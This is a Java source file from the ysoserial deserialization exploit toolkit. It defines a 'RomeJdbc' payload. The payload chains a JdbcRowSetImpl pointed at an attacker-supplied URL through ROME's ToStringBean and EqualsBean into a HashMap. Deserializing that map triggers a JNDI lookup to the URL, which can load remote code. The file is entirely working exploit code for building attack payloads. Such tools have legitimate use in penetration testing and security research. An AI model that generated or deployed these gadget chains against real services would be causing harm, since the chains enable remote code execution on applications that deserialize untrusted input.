package ysoserial.payloads;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.xml.transform.Templates;

@Dependencies("rome:rome:1.0")
@Authors({ Authors.F4NX1NG })
public class RomeJdbc implements ObjectPayload<Object>{
    public Object getObject ( String url) throws Exception {
//        Object o = Gadgets.createTemplatesImpl(command);
        JdbcRowSetImpl jdbcRowset = new JdbcRowSetImpl();
        jdbcRowset.setDataSourceName(url);

        ToStringBean delegate = new ToStringBean(JdbcRowSetImpl.class, jdbcRowset);
        EqualsBean root  = new EqualsBean(ToStringBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(RomeJdbc.class, args);
    }
}
